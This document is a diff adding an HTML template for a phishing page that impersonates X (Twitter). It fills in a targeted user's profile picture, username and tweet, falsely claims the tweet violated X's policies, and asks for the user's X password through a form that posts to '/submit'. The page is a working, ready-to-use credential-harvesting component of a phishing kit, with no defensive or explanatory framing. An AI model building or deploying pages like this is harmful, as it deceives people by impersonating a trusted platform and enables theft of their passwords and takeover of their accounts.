@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Content Violation - X</title>
+    <style>
+        /* X-Themed Global Styles */
+        body {
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+            background-color: #000; /* X.com dark mode */
+            color: #E1E8ED; /* Light grayish text */
+            text-align: center;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            height: 100vh;
+        }
+
+        /* Full Page Layout */
+        .container {
+            width: 100%;
+            max-width: 600px;
+            margin: auto;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* X Header */
+        .header {
+            width: 100%;
+            background-color: #000;
+            padding: 15px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-bottom: 1px solid #000;
+        }
+
+        .header img {
+            width: 40px;
+        }
+
+        /* Profile Section */
+        .profile-container {
+            margin-top: 20px;
+            margin-bottom: 15px;
+        }
+
+        .profile-img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 2px solid #E1E8ED;
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .profile-img:hover {
+            transform: scale(1.1);
+        }
+
+        /* Blurred Tweet Card */
+        .blurred-tweet {
+            width: 90%;
+            max-width: 500px;
+            padding: 15px;
+            font-size: 17px;
+            filter: blur(1.8px); /* Reduced blur */
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(4px);
+            border-radius: 12px;
+            text-shadow: 0 0 3px rgba(0, 0, 0, 0.3);
+            transition: filter 0.3s ease-in-out;
+            box-shadow: 0px 0px 15px rgba(255, 255, 255, 0.08);
+            margin-bottom: 20px;
+        }
+
+        /* Content Warning */
+        .content-warning {
+            font-size: 18px;
+            font-weight: bold;
+            color: #fff; /* X.com warning color */
+            margin-bottom: 15px;
+        }
+
+        /* Login Form */
+        .login-form {
+            width: 90%;
+            max-width: 400px;
+        }
+
+        input {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            background-color: transparent;
+            color: #E1E8ED;
+            border: 1px solid #38444D;
+            border-radius: 8px;
+            outline: none;
+            transition: all 0.3s ease-in-out;
+            margin-bottom: 10px;
+        }
+
+        input:focus {
+            border-color: #fff;
+            box-shadow: 0 0 10px rgba(236, 236, 236, 0.5);
+        }
+
+        /* Centered Button */
+        button {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: bold;
+            background-color: #fff;
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s ease-in-out, transform 0.2s ease-in-out;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #acb0b3;
+            transform: scale(1.05);
+        }
+
+        button:active {
+            background-color: #bec1c4;
+        }
+
+        /* Footer */
+        .footer {
+            width: 100%;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 14px;
+            background: #000;
+            border-top: 1px solid #000;
+            margin-top: auto; /* Push footer to bottom */
+        }
+
+        .footer a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 10px;
+            font-weight: bold;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Mobile Optimization */
+        @media (max-width: 600px) {
+            .blurred-tweet {
+                font-size: 16px;
+            }
+
+            .login-form {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- X Header -->
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/0a/X_logo_2023_%28white%29.svg" alt="X Logo">
+    </div>
+
+    <div class="container">
+        <div class="profile-container">
+            <img src="{{ profile_pic }}" alt="Profile Picture" class="profile-img">
+            <h2>@{{ username }}</h2>
+        </div>
+
+        <div class="blurred-tweet">
+            "{{ tweet }}"
+        </div>
+
+        <div class="content-warning">
+             Your above tweet has violated X's policies!
+             Please  Log in to verifyyour identity.
+        </div>
+
+        <form class="login-form" action="/submit" method="post">
+            <input type="hidden" name="username" value="{{ username }}">
+            <input type="password" name="password" placeholder="Enter your X password" required>
+            <button type="submit">Continue</button>
+        </form>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <a href="#">Privacy Policy</a>
+        <a href="#">Terms of Service</a>
+        <a href="#">Help Center</a>
+    </div>
+
+</body>
+</html>
